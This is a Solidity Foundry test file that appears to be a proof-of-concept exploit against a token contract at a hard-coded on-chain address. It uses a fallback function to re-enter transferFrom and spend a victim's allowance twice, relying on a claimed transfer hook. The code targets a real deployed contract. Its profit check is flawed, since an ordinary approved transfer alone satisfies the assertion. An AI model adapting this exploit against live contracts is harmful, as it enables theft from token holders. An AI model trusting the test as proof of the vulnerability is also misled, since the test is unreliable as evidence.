// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);
    IToken private constant token = IToken(TARGET);
    address private victim = makeAddr("victim");
    uint256 private constant EXPLOIT_AMOUNT = 1_000_000e18;
    bool reentered;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // The victim needs enough tokens for two transfers.
        deal(TARGET, victim, EXPLOIT_AMOUNT * 2);

        // The attacker needs to be approved by the victim for the transfer amount.
        vm.startPrank(victim);
        token.approve(attacker, EXPLOIT_AMOUNT);
        vm.stopPrank();

        // Check initial conditions.
        assertEq(token.balanceOf(victim), EXPLOIT_AMOUNT * 2);
        assertEq(token.allowance(victim, attacker), EXPLOIT_AMOUNT);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        // Attacker starts the exploit by calling transferFrom
                token.transferFrom(victim, attacker, EXPLOIT_AMOUNT);
        uint256 finalBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // The _beforeTokenTransfer hook calls the recipient, which is this contract.
    // This fallback function catches the call and re-enters the transferFrom function.
    fallback() external payable {
        if (!reentered) {
            reentered = true;
            // Re-entrant call to spend the allowance again before it's updated.
            token.transferFrom(victim, attacker, EXPLOIT_AMOUNT);
        }
    }
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

